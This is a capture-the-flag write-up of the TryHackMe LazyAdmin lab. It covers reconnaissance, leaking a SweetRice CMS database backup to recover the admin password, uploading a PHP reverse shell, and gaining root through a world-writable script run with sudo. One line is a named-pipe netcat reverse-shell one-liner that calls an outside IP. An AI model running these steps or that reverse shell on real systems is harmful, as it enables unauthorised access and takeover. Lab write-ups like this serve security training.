---
title: TryHackMe - LazyAdmin                    # Add title of the machine here
date: 2022-05-18 08:00:00 -0600                           # Change the date to match completion date
categories: TryHackMe                    # Change Templates to Writeup
tags: [thm, writeup, fuzzing, webshell, privesc]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
toc: true
image:
  path: /assets/images/thm/LazyAdmin/LazyAdmin.jpeg
--- 

## Info

| Name         | Lazy Admin                                       |
| ------------ | ------------------------------------------------ |
| Room link    | [https://tryhackme.com/room/lazyadmin](https://tryhackme.com/room/lazyadmin)             |
| Difficulty   | Easy                                             |
| Created by   | [MrSeth6797](https://tryhackme.com/p/MrSeth6797) |
| solving date | May 18th 2022                                    |
| ----         |                                                  |



# Recon 

* after starting the machine `export target=10.10.244.50`

## nmap

*   start initial nmap scan

    ```
    # Nmap 7.92 scan initiated Wed May 18 02:32:34 2022 as: nmap -Pn -vv -sS -sV -oN lazyadmin/initial 10.10.244.50
    Increasing send delay for 10.10.244.50 from 0 to 5 due to 248 out of 826 dropped probes since last increase.
    Increasing send delay for 10.10.244.50 from 5 to 10 due to 11 out of 15 dropped probes since last increase.
    Increasing send delay for 10.10.244.50 from 10 to 20 due to 11 out of 13 dropped probes since last increase.
    Increasing send delay for 10.10.244.50 from 20 to 40 due to 11 out of 13 dropped probes since last increase.
    Increasing send delay for 10.10.244.50 from 40 to 80 due to 11 out of 14 dropped probes since last increase.
    Increasing send delay for 10.10.244.50 from 80 to 160 due to 11 out of 12 dropped probes since last increase.
    Increasing send delay for 10.10.244.50 from 160 to 320 due to 11 out of 11 dropped probes since last increase.
    Increasing send delay for 10.10.244.50 from 320 to 640 due to 11 out of 11 dropped probes since last increase.
    Increasing send delay for 10.10.244.50 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
    Nmap scan report for 10.10.244.50
    Host is up, received user-set (0.10s latency).
    Scanned at 2022-05-18 02:32:35 EDT for 110s
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Wed May 18 02:34:25 2022 -- 1 IP address (1 host up) scanned in 110.45 seconds
    ```
* 22 and 80 are open
*   Let’s Navigate to the website, it’s apache2 webserver

    <img src="/assets/images/thm/LazyAdmin/Untitled.png" alt="Untitled" data-size="original">

***

## Website Content Discovery

*   view robots.txt

    * there is no robots.txt file,

    <img src="/assets/images/thm/LazyAdmin/Untitled 1.png" alt="Untitled" data-size="original">
* let’s fuzz this website using ffuf
* `ffuf -w /mnt/hgfs/Pentesting\ Share/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt -u http://$target/FUZZ`
  *   /content found, let’s view this page

      <img src="/assets/images/thm/LazyAdmin/Untitled 2.png" alt="Untitled" data-size="original">

      * it’s running SweetRice CMS
*   searching for any exploit with `searchsploit`

    <img src="/assets/images/thm/LazyAdmin/Untitled 3.png" alt="Untitled" data-size="original">

    `SweetRice 1.5.1 - Backup Disclosure | php/webapps/40718.txt`

    *   exploit content:

        ```
        Title: SweetRice 1.5.1 - Backup Disclosure
        Application: SweetRice
        Versions Affected: 1.5.1
        Vendor URL: http://www.basic-cms.org/
        Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
        Discovered by: Ashiyane Digital Security Team
        Tested on: Windows 10
        Bugs: Backup Disclosure
        Date: 16-Sept-2016

        Proof of Concept :

        You can access to all mysql backup and download them from this directory.
        http://localhost/inc/mysql_backup

        and can access to website files backup from:
        http://localhost/SweetRice-transfer.zip
        ```
* let’s fuzz /content directory
* `ffuf -w /mnt/hgfs/Pentesting\ Share/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt -u http://$target/content/FUZZ`
* images, js, inc, as, themes, attachment found
*   let’s try the exploit with /content/inc directory

    <img src="/assets/images/thm/LazyAdmin/Untitled 4.png" alt="Untitled" data-size="original">
*   backup content

    ```
    <?php return array (
      0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
      1 => 'CREATE TABLE `%--%_attachment` (
      `id` int(10) NOT NULL AUTO_INCREMENT,
      `post_id` int(10) NOT NULL,
      `file_name` varchar(255) NOT NULL,
      `date` int(10) NOT NULL,
      `downloads` int(10) NOT NULL,
      PRIMARY KEY (`id`)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
      2 => 'DROP TABLE IF EXISTS `%--%_category`;',
      3 => 'CREATE TABLE `%--%_category` (
      `id` int(4) NOT NULL AUTO_INCREMENT,
      `name` varchar(255) NOT NULL,
      `link` varchar(128) NOT NULL,
      `title` text NOT NULL,
      `description` varchar(255) NOT NULL,
      `keyword` varchar(255) NOT NULL,
      `sort_word` text NOT NULL,
      `parent_id` int(10) NOT NULL DEFAULT \'0\',
      `template` varchar(60) NOT NULL,
      PRIMARY KEY (`id`),
      UNIQUE KEY `link` (`link`)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
      4 => 'DROP TABLE IF EXISTS `%--%_comment`;',
      5 => 'CREATE TABLE `%--%_comment` (
      `id` int(10) NOT NULL AUTO_INCREMENT,
      `name` varchar(60) NOT NULL DEFAULT \'\',
      `email` varchar(255) NOT NULL DEFAULT \'\',
      `website` varchar(255) NOT NULL,
      `info` text NOT NULL,
      `post_id` int(10) NOT NULL DEFAULT \'0\',
      `post_name` varchar(255) NOT NULL,
      `post_cat` varchar(128) NOT NULL,
      `post_slug` varchar(128) NOT NULL,
      `date` int(10) NOT NULL DEFAULT \'0\',
      `ip` varchar(39) NOT NULL DEFAULT \'\',
      `reply_date` int(10) NOT NULL DEFAULT \'0\',
      PRIMARY KEY (`id`)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
      6 => 'DROP TABLE IF EXISTS `%--%_item_data`;',
      7 => 'CREATE TABLE `%--%_item_data` (
      `id` int(10) NOT NULL AUTO_INCREMENT,
      `item_id` int(10) NOT NULL,
      `item_type` varchar(255) NOT NULL,
      `data_type` varchar(20) NOT NULL,
      `name` varchar(255) NOT NULL,
      `value` text NOT NULL,
      PRIMARY KEY (`id`),
      KEY `item_id` (`item_id`),
      KEY `item_type` (`item_type`),
      KEY `name` (`name`)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
      8 => 'DROP TABLE IF EXISTS `%--%_item_plugin`;',
      9 => 'CREATE TABLE `%--%_item_plugin` (
      `id` int(10) NOT NULL AUTO_INCREMENT,
      `item_id` int(10) NOT NULL,
      `item_type` varchar(255) NOT NULL,
      `plugin` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
      10 => 'DROP TABLE IF EXISTS `%--%_links`;',
      11 => 'CREATE TABLE `%--%_links` (
      `lid` int(10) NOT NULL AUTO_INCREMENT,
      `request` text NOT NULL,
      `url` text NOT NULL,
      `plugin` varchar(255) NOT NULL,
      PRIMARY KEY (`lid`)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
      12 => 'DROP TABLE IF EXISTS `%--%_options`;',
      13 => 'CREATE TABLE `%--%_options` (
      `id` int(10) NOT NULL AUTO_INCREMENT,
      `name` varchar(255) NOT NULL,
      `content` mediumtext NOT NULL,
      `date` int(10) NOT NULL,
      PRIMARY KEY (`id`),
      UNIQUE KEY `name` (`name`)
    ) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
      14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
      15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
      16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
      17 => 'DROP TABLE IF EXISTS `%--%_posts`;',
      18 => 'CREATE TABLE `%--%_posts` (
      `id` int(10) NOT NULL AUTO_INCREMENT,
      `name` varchar(255) NOT NULL,
      `title` varchar(255) NOT NULL,
      `body` longtext NOT NULL,
      `keyword` varchar(255) NOT NULL DEFAULT \'\',
      `tags` text NOT NULL,
      `description` varchar(255) NOT NULL DEFAULT \'\',
      `sys_name` varchar(128) NOT NULL,
      `date` int(10) NOT NULL DEFAULT \'0\',
      `category` int(10) NOT NULL DEFAULT \'0\',
      `in_blog` tinyint(1) NOT NULL,
      `views` int(10) NOT NULL,
      `allow_comment` tinyint(1) NOT NULL DEFAULT \'1\',
      `template` varchar(60) NOT NULL,
      PRIMARY KEY (`id`),
      UNIQUE KEY `sys_name` (`sys_name`),
      KEY `date` (`date`)
    ) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
    );?>
    ```
* "passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\” I think it’s a hashed password, so let’s crack it using hashes.com

***





# Gaining Access 

<img src="/assets/images/thm/LazyAdmin/Untitled 5.png" alt="Untitled" data-size="original">

* great, now we have the password for user ‘manager’ and he is admin, let’s navigate to the discovered directories to find admin login page
* images, js, inc, as, themes, attachment, we can find the login page in /content/as
*   try the username and the password we found

    <img src="/assets/images/thm/LazyAdmin/Untitled 6.png" alt="Untitled" data-size="original">

    <img src="/assets/images/thm/LazyAdmin/Untitled 7.png" alt="Untitled" data-size="original">
*   we can see there is ads section and there is ads directory in /content/inc, so let’s create an ad with our php reverse shell

    <img src="/assets/images/thm/LazyAdmin/Untitled 8.png" alt="Untitled" data-size="original">
* now we can run the code by navigating to http:///content/inc/ad/juba.php

***





## Stabilize the shell 

```bash
$ which python
/usr/bin/python
$ python -c 'from pty import spawn ; spawn("/bin/bash")'
www-data@THM-Chal:/$ export TERM=xterm  
export TERM=xterm
www-data@THM-Chal:/$ ^Z
zsh: suspended  nc -nlvp 9050
                                                                                                                                           
┌──(root💀kali)-[/home/juba]
└─# stty raw -echo ; fg                                                                                                          148 ⨯ 1 ⚙
[1]  + continued  nc -nlvp 9050

www-data@THM-Chal:/$
```

***





## User.txt flag

```bash
www-data@THM-Chal:/$ ls
bin    dev   initrd.img      lost+found  opt   run   srv  usr      vmlinuz.old
boot   etc   initrd.img.old  media   proc  sbin  sys  var
cdrom  home  lib         mnt     root  snap  tmp  vmlinuz
www-data@THM-Chal:/$ cd /home
www-data@THM-Chal:/home$ ls
itguy
www-data@THM-Chal:/home$ cd itguy/
www-data@THM-Chal:/home/itguy$ ls 
Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
Documents  Music      Public    Videos     examples.desktop  user.txt
www-data@THM-Chal:/home/itguy$ cat user.txt 
THM{63e*****************************}
www-data@THM-Chal:/home/itguy$
```

***





## Privilege Escalation

```bash
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$
```

* Oh !!, he is a very lazy sysad, I can run perl and backup.pl as root with no password
* backup.pl content, if we list the file we will see that there is no write permission for us

```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

*   but if we list copy.sh we will see this

    ```perl
    www-data@THM-Chal:/home/itguy$ ls -l /etc/copy.sh 
    -rw-r--rwx 1 root root 97 May 18 11:15 /etc/copy.sh
    ```
*   we can edit copy.sh, we can type a reverse shell inside the file, but for simplicity we will use `bash -p`

    ```bash
    root@THM-Chal:/etc# cat copy.sh 
    whoami
    bash -p
    # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
    www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.pl
    root
    root@THM-Chal:/etc# whoami
    root
    ```

    * Great, we are root
*   get root.txt flag

    ```bash
    root@THM-Chal:/etc# cd 
    root@THM-Chal:~# ls
    root.txt
    root@THM-Chal:~# cat root.txt
    THM{663*****************************}
    ```

***
